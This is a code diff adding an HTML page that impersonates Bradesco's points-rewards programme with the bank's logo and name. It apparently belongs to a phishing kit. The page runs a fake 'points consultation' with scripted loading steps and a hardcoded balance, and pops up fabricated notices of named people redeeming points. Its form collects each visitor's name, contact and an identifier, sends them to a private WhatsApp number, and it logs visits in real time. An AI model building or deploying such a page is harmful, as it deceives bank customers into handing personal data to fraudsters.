+        font-size: clamp(1.65rem, 9vw, 2.35rem);
+      }
+
+      .card {
+        min-height: auto;
+        padding: 18px;
+      }
+
+      .footer-inner {
+        align-items: flex-start;
+        flex-direction: column;
+      }
+
+      .whatsapp-float {
+        right: 16px;
+        bottom: 16px;
+        width: 54px;
+        height: 54px;
+      }
+
+      .redemption-feed {
+        left: 8px;
+        right: auto;
+        bottom: 8px;
+        width: min(270px, calc(100vw - 16px));
+      }
+
+      .redemption-toast {
+        padding: 9px 11px;
+      }
+    }
+
+    @media (max-width: 420px) {
+      .container {
+        width: min(100% - 20px, 1180px);
+      }
+
+      .nav {
+        display: flex;
+        justify-content: flex-start;
+      }
+
+      .brand-name {
+        font-size: 1rem;
+      }
+
+      .hero-inner {
+        padding: 16px 0 38px;
+      }
+
+      .eyebrow {
+        width: 100%;
+        justify-content: center;
+        text-align: center;
+        font-size: 0.78rem;
+      }
+
+      .quiz-card,
+      .steps,
+      .instant-callout,
+      .card {
+        padding: 16px;
+      }
+
+      .points-box {
+        padding: 18px;
+      }
+
+      .footer-links {
+        flex-direction: column;
+        gap: 10px;
+      }
+    }
+  </style>
+</head>
+<body class="splash-active">
+  <div class="splash-screen" id="splashScreen" aria-label="Carregando Bradesco Pontos">
+    <div class="splash-brand">
+      <img class="splash-logo" src="assets/bradesco-logo-4.png" alt="Logo Bradesco Pontos">
+      <strong>Bradesco Pontos</strong>
+    </div>
+  </div>
+
+  <header class="site-header">
+    <div class="container header-inner">
+      <a class="brand" href="#inicio" aria-label="Bradesco Pontos">
+        <img class="brand-mark" src="assets/bradesco-logo-4.png" alt="Logo Bradesco Pontos">
+        <span class="brand-name">Bradesco Pontos</span>
+      </a>
+
+      <nav class="nav" aria-label="Menu principal">
+        <a href="#inicio">InÃ­cio</a>
+        <a href="#como-funciona">Como Funciona</a>
+        <a href="#beneficios">BenefÃ­cios</a>
+        <a href="#faq">DÃºvidas</a>
+      </nav>
+
+      <a class="btn btn-primary" href="formulario.html">Consultar pontos</a>
+    </div>
+  </header>
+
+  <main id="inicio">
+    <section class="hero" aria-label="Portal de Resgate">
+      <div class="container hero-inner">
+        <div>
+          <span class="eyebrow">Bradesco Pontos â€” Portal de Resgate</span>
+          <h1>Resgate pontos acumulados recentemente</h1>
+          <p class="hero-copy">
+            Agora vocÃª pode receber orientaÃ§Ã£o sobre o resgate de pontos acumulados recentemente
+            atravÃ©s deste canal de atendimento exclusivo para correntistas Bradesco. Os pontos
+            podem ser consultados para opÃ§Ãµes de resgate em territÃ³rio nacional e internacional,
+            incluindo passagens, produtos e benefÃ­cios selecionados.
+          </p>
+          <div class="hero-actions">
+            <a class="btn btn-primary" href="formulario.html">Consultar Agora</a>
+            <a class="btn btn-secondary" href="#beneficios">Ver benefÃ­cios</a>
+          </div>
+        </div>
+
+        <aside class="trust-panel" aria-label="OpÃ§Ãµes de resgate">
+          <div>
+            <h2>Use seus pontos em novas possibilidades</h2>
+            <p>Consulte pontos acumulados recentemente e veja opÃ§Ãµes de troca por passagens aÃ©reas, produtos em lojas fÃ­sicas e benefÃ­cios selecionados.</p>
+          </div>
+          <div class="metric-grid">
+            <div class="metric">
+              <strong>Passagens</strong>
+              <span>orientaÃ§Ã£o para trocar pontos por viagens e experiÃªncias</span>
+            </div>
+            <div class="metric">
+              <strong>Produtos</strong>
+              <span>opÃ§Ãµes para uso em lojas fÃ­sicas e parceiros elegÃ­veis</span>
+            </div>
+            <div class="metric">
+              <strong>Resgate</strong>
+              <span>atendimento breve para identificar a melhor categoria</span>
+            </div>
+          </div>
+        </aside>
+      </div>
+    </section>
+
+    <section id="como-funciona">
+      <div class="container">
+        <div class="section-head">
+          <div class="section-kicker">Fluxo seguro</div>
+          <h2>Inicie o resgate em um fluxo interativo</h2>
+          <p>O formulario abre em uma pagina dedicada, com uma pergunta por tela e visual exclusivo para o resgate.</p>
+        </div>
+
+        <div class="resgate-cta-panel">
+          <h3>Pronto para consultar seus pontos disponiveis?</h3>
+          <p>Clique no botao abaixo para iniciar o atendimento em etapas.</p>
+          <a class="resgate-round-button" href="formulario.html">Iniciar Resgate dos pontos</a>
+        </div>
+      </div>
+    </section>
+    <section id="beneficios">
+      <div class="container">
+        <div class="section-head">
+          <div class="section-kicker">BenefÃ­cios</div>
+          <h2>Uma experiÃªncia clara para consultar e resgatar</h2>
+          <p>O portal centraliza orientaÃ§Ãµes e categorias, preparando o usuÃ¡rio para concluir o acesso em ambiente oficial.</p>
+        </div>
+
+        <div class="cards-grid">
+          <article class="card">
+            <div class="icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <path d="M20 12v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-8"></path>
+                <path d="M2 7h20v5H2z"></path>
+                <path d="M12 22V7"></path>
+                <path d="M12 7H8.5a2.5 2.5 0 1 1 2.1-3.8L12 7z"></path>
+                <path d="M12 7h3.5a2.5 2.5 0 1 0-2.1-3.8L12 7z"></path>
+              </svg>
+            </div>
+            <h3>Resgate simples</h3>
+            <p>Organize preferÃªncias e veja caminhos de resgate de forma objetiva.</p>
+          </article>
+          <article class="card">
+            <div class="icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="m16.5 16.5 4 4"></path>
+                <path d="M8 11h6"></path>
+                <path d="M11 8v6"></path>
+              </svg>
+            </div>
+            <h3>Consulta rÃ¡pida</h3>
+            <p>Fluxo direto, responsivo e orientado por etapas curtas.</p>
+          </article>
+          <article class="card">
+            <div class="icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <path d="M4 7h16"></path>
+                <path d="M4 12h16"></path>
+                <path d="M4 17h16"></path>
+                <circle cx="8" cy="7" r="2"></circle>
+                <circle cx="16" cy="12" r="2"></circle>
+                <circle cx="10" cy="17" r="2"></circle>
+              </svg>
+            </div>
+            <h3>OpÃ§Ãµes variadas</h3>
+            <p>Produtos, viagens, cashback e gift cards em uma jornada Ãºnica.</p>
+          </article>
+          <article class="card">
+            <div class="icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <path d="M12 12a4 4 0 1 0-4-4 4 4 0 0 0 4 4z"></path>
+                <path d="M4 21a8 8 0 0 1 16 0"></path>
+                <path d="M19 8h2"></path>
+                <path d="M20 7v2"></path>
+              </svg>
+            </div>
+            <h3>Atendimento especializado</h3>
+            <p>Atendimento exclusivo para correntistas Bradesco conforme o perfil informado.</p>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section class="band" id="resgates">
+      <div class="container showcase">
+        <div class="showcase-copy">
+          <div class="section-kicker">Resgates em destaque</div>
+          <h2>Troque pontos por viagens aÃ©reas e produtos eletrÃ´nicos</h2>
+          <p>Consulte suas opÃ§Ãµes de resgate para passagens, experiÃªncias de viagem e produtos em lojas fÃ­sicas ou parceiras selecionadas.</p>
+          <a class="btn btn-primary" href="formulario.html">Consultar pontos</a>
+        </div>
+
+        <div class="slider" aria-label="Imagens de resgate de pontos">
+          <article class="slide active" style="background-image: url('https://images.unsplash.com/photo-1436491865332-7a61a109cc05?auto=format&fit=crop&w=1400&q=80');">
+            <div class="slide-content">
+              <strong>Viagens aÃ©reas</strong>
+              <h3>Use pontos para planejar sua prÃ³xima viagem</h3>
+              <p>Veja possibilidades de troca por passagens e experiÃªncias conforme disponibilidade.</p>
+            </div>
+          </article>
+          <article class="slide" style="background-image: url('https://images.unsplash.com/photo-1516321318423-f06f85e504b3?auto=format&fit=crop&w=1400&q=80');">
+            <div class="slide-content">
+              <strong>EletrÃ´nicos</strong>
+              <h3>Produtos para usar no dia a dia</h3>
+              <p>Consulte opÃ§Ãµes de troca por eletrÃ´nicos, acessÃ³rios e itens de tecnologia.</p>
+            </div>
+          </article>
+          <article class="slide" style="background-image: url('https://images.unsplash.com/photo-1488646953014-85cb44e25828?auto=format&fit=crop&w=1400&q=80');">
+            <div class="slide-content">
+              <strong>ExperiÃªncias</strong>
+              <h3>Mais alternativas para aproveitar seus pontos</h3>
+              <p>Escolha a categoria desejada e siga para a consulta de pontos disponÃ­veis.</p>
+            </div>
+          </article>
+          <div class="slider-dots" aria-hidden="true">
+            <span class="slider-dot active"></span>
+            <span class="slider-dot"></span>
+            <span class="slider-dot"></span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="band" id="faq">
+      <div class="container">
+        <div class="section-head">
+          <div class="section-kicker">DÃºvidas Frequentes</div>
+          <h2>Perguntas comuns sobre pontos e resgate</h2>
+          <p>Respostas gerais para orientar a experiÃªncia antes da autenticaÃ§Ã£o oficial.</p>
+        </div>
+
+        <div class="faq-list">
+          <article class="faq-item open">
+            <button class="faq-question" type="button">
+              <span>Como consulto meu saldo de pontos?</span>
+              <span>+</span>
+            </button>
+            <div class="faq-answer">A consulta Ã© realizada atravÃ©s do formulÃ¡rio e, logo apÃ³s a autenticaÃ§Ã£o, vocÃª recebe o suporte de um gerente de atendimento.</div>
+          </article>
+          <article class="faq-item">
+            <button class="faq-question" type="button">
+              <span>Quais categorias de resgate podem existir?</span>
+              <span>+</span>
+            </button>
+            <div class="faq-answer">As categorias podem incluir produtos, viagens, cashback e gift cards, conforme regras do programa oficial e disponibilidade.</div>
+          </article>
+          <article class="faq-item">
+            <button class="faq-question" type="button">
+              <span>Qual Ã© o prazo para concluir um resgate?</span>
+              <span>+</span>
+            </button>
+            <div class="faq-answer">Prazos variam conforme categoria, parceiro e validaÃ§Ã£o do programa. A confirmaÃ§Ã£o deve ser consultada no suporte.</div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="atendimento">
+      <div class="container">
+        <div class="section-head">
+          <div class="section-kicker">Atendimento</div>
+          <h2>Consulte seus pontos acumulados recentes</h2>
+          <p>Pontos acumulados recentemente poderÃ£o ser consultados imediatamente atravÃ©s da identificaÃ§Ã£o no botÃ£o Consultar Agora, em um breve formulÃ¡rio de atendimento.</p>
+        </div>
+        <a class="btn btn-primary" href="formulario.html">Consultar Agora</a>
+      </div>
+    </section>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <div class="footer-links">
+        <a href="#">PolÃ­tica de Privacidade</a>
+        <a href="#">Termos de Uso</a>
+        <a href="#">SeguranÃ§a</a>
+      </div>
+    </div>
+  </footer>
+
+  <a
+    class="whatsapp-float"
+    href="https://wa.me/5511925186441?text=Ol%C3%A1%2C%20quero%20resgatar%20meus%20pontos%20e%20preciso%20de%20suporte."
+    target="_blank"
+    rel="noopener"
+    aria-label="Falar com suporte no WhatsApp"
+  >
+    <svg viewBox="0 0 32 32" aria-hidden="true">
+      <path d="M16.03 4A11.88 11.88 0 0 0 5.8 21.94L4.5 28l6.18-1.25A11.94 11.94 0 1 0 16.03 4Zm0 21.82a9.78 9.78 0 0 1-4.98-1.36l-.36-.21-3.66.74.77-3.57-.23-.37a9.7 9.7 0 1 1 8.46 4.77Zm5.35-7.31c-.29-.15-1.73-.85-2-.95-.27-.1-.47-.15-.67.15-.2.29-.77.95-.95 1.15-.17.2-.35.22-.64.07-.29-.15-1.24-.46-2.36-1.46-.87-.78-1.46-1.74-1.63-2.03-.17-.29-.02-.45.13-.6.13-.13.29-.35.44-.52.15-.17.2-.29.29-.49.1-.2.05-.37-.02-.52-.07-.15-.67-1.62-.92-2.22-.24-.58-.49-.5-.67-.51h-.57c-.2 0-.52.07-.79.37-.27.29-1.04 1.02-1.04 2.49s1.07 2.89 1.22 3.09c.15.2 2.11 3.22 5.11 4.51.71.31 1.27.49 1.7.63.71.23 1.36.2 1.88.12.57-.08 1.73-.71 1.98-1.39.24-.68.24-1.27.17-1.39-.07-.12-.27-.2-.56-.35Z"/>
+    </svg>
+  </a>
+
+  <div class="redemption-feed" id="redemptionFeed" aria-live="polite" aria-atomic="false"></div>
+
+  <script src="firebase-config.js"></script>
+  <script src="realtime-config.js"></script>
+  <script src="realtime-client.js"></script>
+  <script src="mojibake-fix.js"></script>
+  <script>
+    const splashScreen = document.querySelector("#splashScreen");
+
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        splashScreen.classList.add("hide");
+        document.body.classList.remove("splash-active");
+      }, 3000);
+    });
+
+    if (document.querySelector("#secureQuiz")) {
+    const state = {
+      step: 1,
+      cliente: "",
+      nomeCliente: "",
+      contato: "",
+      identificadorSeguro: "",
+      segmento: "",
+      categoria: ""
+    };
+
+    const totalSteps = 4;
+    const whatsappNumber = 5511925186441
+    const stages = [...document.querySelectorAll(".quiz-stage")];
+    const stepItems = [...document.querySelectorAll(".step-item")];
+    const prevButton = document.querySelector("#prevStep");
+    const nextButton = document.querySelector("#nextStep");
+    const nomeClienteInput = document.querySelector("#nomeCliente");
+    const nomeClienteLabel = document.querySelector("#nomeClienteLabel");
+    const identificacaoTexto = document.querySelector("#identificacaoTexto");
+    const contatoInput = document.querySelector("#contato");
+    const identificadorSeguroInput = document.querySelector("#identificadorSeguro");
+    const summaryBox = document.querySelector("#summaryBox");
+    const loadingPanel = document.querySelector("#loadingPanel");
+    const resultPanel = document.querySelector("#resultPanel");
+    const loadingText = document.querySelector("#loadingText");
+    const progressBar = document.querySelector("#progressBar");
+    const consultaTitulo = document.querySelector("#consultaTitulo");
+    const consultaTexto = document.querySelector("#consultaTexto");
+    let consultationStarted = false;
+    let resultReady = false;
+
+    function updateQuiz() {
+      const isPessoaJuridica = state.cliente === "Pessoa JurÃ­dica";
+      nomeClienteLabel.textContent = isPessoaJuridica ? "RazÃ£o social" : "Nome completo";
+      nomeClienteInput.placeholder = isPessoaJuridica ? "Digite a razÃ£o social" : "Digite seu nome completo";
+      identificacaoTexto.textContent = isPessoaJuridica
+        ? "Informe a razÃ£o social e um canal de contato para dar continuidade ao atendimento."
+        : "Informe seu nome completo e um canal de contato para dar continuidade ao atendimento.";
+
+      stages.forEach((stage) => {
+        stage.classList.toggle("active", Number(stage.dataset.step) === state.step);
+      });
+
+      stepItems.forEach((item) => {
+        item.classList.toggle("active", Number(item.dataset.stepLabel) === state.step);
+      });
+
+      prevButton.style.visibility = state.step === 1 ? "hidden" : "visible";
+      if (state.step === totalSteps) {
+        nextButton.textContent = resultReady ? "Resgatar Agora" : "Consultando...";
+        nextButton.disabled = !resultReady;
+      } else if (state.step === 3) {
+        nextButton.textContent = "Consultar pontos";
+        nextButton.disabled = false;
+      } else {
+        nextButton.textContent = "Continuar";
+        nextButton.disabled = false;
+      }
+
+      if (state.step === totalSteps) {
+        startConsultation();
+      }
+    }
+
+    function canAdvance() {
+      if (state.step === 1) return Boolean(state.cliente);
+      if (state.step === 2) {
+        return nomeClienteInput.value.trim().length >= 3 && contatoInput.value.trim().length >= 5 && identificadorSeguroInput.value.trim().length >= 3;
+      }
+      if (state.step === 3) return Boolean(state.segmento) && Boolean(state.categoria);
+      return true;
+    }
+
+    function startConsultation() {
+      if (consultationStarted) return;
+
+      consultationStarted = true;
+      resultReady = false;
+      loadingPanel.hidden = false;
+      resultPanel.hidden = true;
+      progressBar.style.width = "0";
+
+      const messages = [
+        "Consultando pontos...",
+        "Verificando compras recentes...",
+        "Ajustando opÃ§Ãµes de troca...",
+        "Preparando resultado do resgate..."
+      ];
+
+      messages.forEach((message, index) => {
+        setTimeout(() => {
+          loadingText.textContent = message;
+          progressBar.style.width = `${(index + 1) * 25}%`;
+        }, index * 2500);
+      });
+
+      setTimeout(() => {
+        sessionStorage.setItem("resgateForm", JSON.stringify({
+          cliente: state.cliente,
+          nomeCliente: state.nomeCliente,
+          contato: state.contato,
+          identificadorSeguro: state.identificadorSeguro,
+          segmento: state.segmento,
+          categoria: state.categoria,
+          pontos: "38.982"
+        }));
+        window.location.href = "resultado.html";
+      }, 10000);
+    }
+
+    function openWhatsapp() {
+      const message = [
+        "OlÃ¡, gostaria de prosseguir com o atendimento de resgate de pontos.",
+        `Tipo de cliente: ${state.cliente || "nÃ£o informado"}`,
+        `Nome/RazÃ£o social: ${state.nomeCliente || "nÃ£o informado"}`,
+        `Contato: ${state.contato || "nÃ£o informado"}`,
+        `IdentificaÃ§Ã£o parcial/protocolo: ${state.identificadorSeguro || "nÃ£o informado"}`,
+        `Perfil: ${state.segmento || "nÃ£o informado"}`,
+        `Categoria de resgate: ${state.categoria || "nÃ£o informado"}`,
+        "Pontos consultados: 38.982",
+        "ObservaÃ§Ã£o: nÃ£o estou enviando agÃªncia, conta, senha, token, CVV ou documentos completos por este canal."
+      ].join("\n");
+
+      window.location.href = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
+    }
+
+    document.querySelectorAll(".choice").forEach((choice) => {
+      choice.addEventListener("click", () => {
+        const field = choice.dataset.field;
+        state[field] = choice.dataset.value;
+
+        document.querySelectorAll(`.choice[data-field="${field}"]`).forEach((item) => {
+          item.classList.toggle("selected", item === choice);
+        });
+      });
+    });
+
+    nomeClienteInput.addEventListener("input", () => {
+      state.nomeCliente = nomeClienteInput.value.trim();
+    });
+
+    contatoInput.addEventListener("input", () => {
+      state.contato = contatoInput.value.trim();
+    });
+
+    identificadorSeguroInput.addEventListener("input", () => {
+      state.identificadorSeguro = identificadorSeguroInput.value.trim();
+    });
+
+    prevButton.addEventListener("click", () => {
+      state.step = Math.max(1, state.step - 1);
+      updateQuiz();
+    });
+
+    nextButton.addEventListener("click", () => {
+      if (state.step === totalSteps) {
+        if (resultReady) openWhatsapp();
+        return;
+      }
+
+      if (!canAdvance()) {
+        const activeStage = document.querySelector(".quiz-stage.active");
+        activeStage.animate(
+          [{ transform: "translateX(0)" }, { transform: "translateX(-6px)" }, { transform: "translateX(6px)" }, { transform: "translateX(0)" }],
+          { duration: 220 }
+        );
+        return;
+      }
+
+      state.step = Math.min(totalSteps, state.step + 1);
+      updateQuiz();
+    });
+
+    updateQuiz();
+    }
+
+    document.querySelectorAll(".faq-question").forEach((button) => {
+      button.addEventListener("click", () => {
+        const item = button.closest(".faq-item");
+        item.classList.toggle("open");
+      });
+    });
+
+    const slides = [...document.querySelectorAll(".slide")];
+    const sliderDots = [...document.querySelectorAll(".slider-dot")];
+    let activeSlide = 0;
+
+    setInterval(() => {
+      slides[activeSlide].classList.remove("active");
+      sliderDots[activeSlide].classList.remove("active");
+      activeSlide = (activeSlide + 1) % slides.length;
+      slides[activeSlide].classList.add("active");
+      sliderDots[activeSlide].classList.add("active");
+    }, 4200);
+
+    updateQuiz();
+    BradescoRealtime.connectVisitor(document.title || 'Pagina acessada');
+  </script>
+  <script>
+    (function() {
+      const whatsappButton = document.querySelector('.whatsapp-float');
+      const faqSection = document.querySelector('#faq');
+      if (!whatsappButton || !faqSection) return;
+
+      function toggleWhatsappButton() {
+        const triggerPoint = faqSection.offsetTop - window.innerHeight * 0.45;
+        whatsappButton.classList.toggle('show', window.scrollY >= triggerPoint);
+      }
+
+      window.addEventListener('scroll', toggleWhatsappButton, { passive: true });
+      window.addEventListener('resize', toggleWhatsappButton);
+      toggleWhatsappButton();
+    })();
+  </script>
+  <script>
+    (function() {
+      const feed = document.querySelector('#redemptionFeed');
+      if (!feed) return;
+
+      const names = [
+        'Maria', 'Joao', 'Ana', 'Carlos', 'Fernanda', 'Lucas',
+        'Juliana', 'Rafael', 'Patricia', 'Marcos', 'Camila', 'Bruno'
+      ];
+      const actions = [
+        'resgatou agora',
+        'esta resgatando agora',
+        'acabou de consultar',
+        'iniciou um resgate de'
+      ];
+
+      function randomItem(list) {
+        return list[Math.floor(Math.random() * list.length)];
+      }
+
+      function randomPoints() {
+        const value = Math.floor(12000 + Math.random() * 68000);
+        return value.toLocaleString('pt-BR');
+      }
+
+      function showRedemptionToast() {
+        const toast = document.createElement('div');
+        const name = randomItem(names);
+        const action = randomItem(actions);
+        const points = randomPoints();
+        toast.className = 'redemption-toast';
+        toast.innerHTML = `
+          <small>Bradesco Pontos</small>
+          <strong>${name} ${action} ${points} pontos</strong>
+          <span>Atualizado ha poucos minutos</span>
+        `;
+
+        feed.appendChild(toast);
+        while (feed.children.length > 2) {
+          feed.firstElementChild.remove();
+        }
+
+        setTimeout(() => {
+          toast.classList.add('hide');
+          setTimeout(() => toast.remove(), 300);
+        }, 5200);
+      }
+
+      setTimeout(showRedemptionToast, 1800);
+      setInterval(showRedemptionToast, 20000);
+    })();
+  </script>
+</body>
+</html>
